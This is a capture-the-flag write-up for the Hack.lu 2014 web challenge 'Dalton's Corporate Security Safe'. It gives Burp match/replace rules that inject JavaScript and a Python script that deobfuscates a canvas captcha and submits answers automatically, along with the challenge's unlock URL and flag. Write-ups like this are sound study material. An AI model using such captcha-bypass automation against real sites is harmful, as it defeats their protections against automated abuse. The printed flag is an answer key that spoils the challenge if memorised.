---
layout: post
title: "Hack.lu 2014 - Dalton's Corporate Security Safe for Business"
date: 2014-10-24 23:54
comments: true
categories: [web, hacklu, hackluctf, burp]
author: hammertime
---

## Challenge
The Dalton Brothers are tricking people into buying their "safe" locks. So they
can rob them afterwards. The lock has some safety features, as it resets itself
after a few seconds. It also requires a lot of valid inputs before it's letting
you open it. Please find out what their weakness is and report back. 

[link](https://wildwildweb.fluxfingers.net:1422/)

## Analysis
The captcha image is being painted in a canvas clientside by JavaScript. This
is done in 8 ways. 3 examples are:

1) Base64 Decoding a value
2) Using Javascript.fromCharCode()
3) /n/.source

These values are then inserted using
[fillText()](http://www.w3schools.com/tags/canvas_filltext.asp). The fillText
function looks like this (var,x,y), where x is left right relative to the HTML
canvas and y is up down relative to the canvas.  So to put the numbers in
order, you can grep out the fillText functions and sort by the x position to
get them in the right order.

## Solution
Since there is a lot of variance in how the variables are assigned and used to
build the captcha (including some variable reuse), it seemed to make the most
sense to store these values immediately after they are used, then populate and
submit the form automatically. Because of this, I decided to modify the
JavaScript inline using Burp. I used the following search/replace rules on the
response body:

```
match: <script>
replace: <script>blakeval={};
```

```
match: fillText\((.*?)\)
replace: fillText($1);var args="$1".split(','); var b1=args[0]; var b2=args[1]; blakeval[b2]=eval(b1);
```

```
match: </script>
replace: var fieldval = ""; for(var key in blakeval) { fieldval += blakeval[key] }; document.getElementsByName('solution')[0].value = fieldval; document.forms[0].submit()</script>
```

By using the x index from fillItem() as the key in property, it will be autosorted in the way that we need. Then simply populate the form and submit. Wait a while and then the link is unlocked.

```
https://wildwildweb.fluxfingers.net:1422/?login=rRrtTE0WYFh5bVHToYQwKyvP
```

Flag:
```
fef9565c97c3a62fe10d2a0084a9e8179d72f4a05084997cb80e900d1a77a42e3
```

## Alternative Solution

This solution (written in Python) utilizes the following workflow:
 * Request the HTTP session, find the &lt;script&gt; and separate the
   Javascript into individual lines
 * Parse the Javascript (minding the X-coordinate of the textfill() function to
   reassemble the order.  There are a total of eight tricks they're using to
   obfuscate the characters, so there's are eight branches depending on which
   one we've encountered.
 * Extract the characters and PHP session ID, then resubmit the page.
 * Loop repeatedly until the locks allow access to the flag
 * Access the flag when the URL is unlocked.

It's a terrible, terrible script, but here it is for grins.

```python
#!/usr/bin/python

import sys
import re # RegEx to extract <script> .* </script>
import requests   # Used for GET/POST requests
import base64  # Needed to deobfuscate some of the characters

# This generates Javascript output and is used to verify the decoding of each character and position
debug = False

# The hard work is broken into four functions
#   isALetter - detect the presence of any of the eight obfuscation methods
#   extractLetter - deobfuscate the Javascript (using one of eight techniques)
#   isAPosition - detects the presence of fillText() which is used to draw a character and includes the X,Y coordinates
#   extractPosition - extracts the X coordinates of the character being printed

def extractLetter(line):
  if 'atob' in line:
    if debug: print "1", line,
    line = line.split("(")[1]
    line = line.split(")")[0]
    line = base64.b64decode(line)
    if debug: print  line
    return line
  elif 'fromCharCode' in line:
    if debug: print "2", line,
    line = line.split("(")[1]
    line = line.split(")")[0]
    line = chr(int(line))
    if debug: print  line
    return line
  elif '.source' in line:
    if debug: print "3", line, 
    line = line.split("/")[1]
    line = line.split("/")[0]
    if debug: print line
    return line
  elif '!1' in line:    #false
    string = "false"
    if debug: print "4", line, 
    line = line.split("[")[1]
    line = line.split("]")[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif '[]+{}' in line:  #[object Object]
    string = "[object Object]"
    if debug: print "5", line, 
    line = line.split("[")[2]
    if debug: print "/",line,"/",
    line = line.split("]")[0]
    if debug: print "|",line,"|",
    line = string[int(line)]
    if debug: print line
    return line
  elif """[][+[]]+""""" in line:
    string = "undefined"
    if debug: print "6", line, 
    line = line.split("[")[4]
    line = line.split("]")[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif "''+!0" in line:
    string = "true"
    if debug: print "7", line, 
    line = line.split("[")[1]
    line = line.split("]")[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif ").toString(" in line: 
    string = "0123456789abcdefghijklmnopqrstuvwxyz"
    if debug: print "8", line, 
    line = line.split("(")[1]
    line = line.split(")")[0]
    line = string[int(line)]
    if debug: print line
    return line
  elif 'var' in line and 'createLinearGradient' not in line and 'getContext' not in line:
    print "?", line
    return ""
  elif 'fillText' in line:
    if debug: print "!", line
    return ""
  else: 
    return ""

def isALetter(line):
  if 'atob' in line: return True
  elif 'fromCharCode' in line: return True
  elif '.source' in line: return True
  elif '!1' in line: return True
  elif '[]+{}' in line: return True
  elif """[][+[]]+""""" in line: return True
  elif "''+!0" in line: return True
  elif ").toString(" in line: return True
  else: return False

def isAPosition(line):
  if 'fillText' in line: return True

def extractPosition(line):
  if 'fillText' in line:
    pos = line.split(",")[1]
    if debug: print "POS = ", pos
    return int(pos)
  else:
    return false

url='https://wildwildweb.fluxfingers.net:1422/'
cookies = dict()
params = dict()
PHPSESSID = ""

r = requests.get(url, cookies=cookies)

PHPSESSID = r.cookies['PHPSESSID']
cookies['PHPSESSID'] = PHPSESSID

for i in range(0,100):

  r = requests.get(url, cookies=cookies)
  #print r.cookies['PHPSESSID']

  script = re.findall(r".*script.*", r.content)[0]
  scriptLines = re.sub(r";", ";\n", script)
  scriptLines = scriptLines.split("\n")

  answerArray = [None] * 100
  answerString = ""

  for scriptLine in scriptLines:
    if isALetter(scriptLine):
      letter = extractLetter(scriptLine)
    if isAPosition(scriptLine):
      position = extractPosition(scriptLine)
      answerArray[position] = letter

  for letter in answerArray:
    if letter != None:
      answerString += letter

  print " -- REPLYING:" , answerString
  params['solution'] = answerString
  params['submit'] = "OK"

  r = requests.post(url, cookies=cookies, data=params)

  # print r.content

  for line in r.content.splitlines():
    if '<p>' in line: print line
    if '<li>' in line:
      print line
      if 'a href="?login=' in line:
        line = line.split('"')
        q = requests.get(url + line[1], cookies=cookies)
        print q.content
        sys.exit(0)
    if 'slow' in line: print line
    if 'anew' in line: print line
    if 'good' in line: print line
```
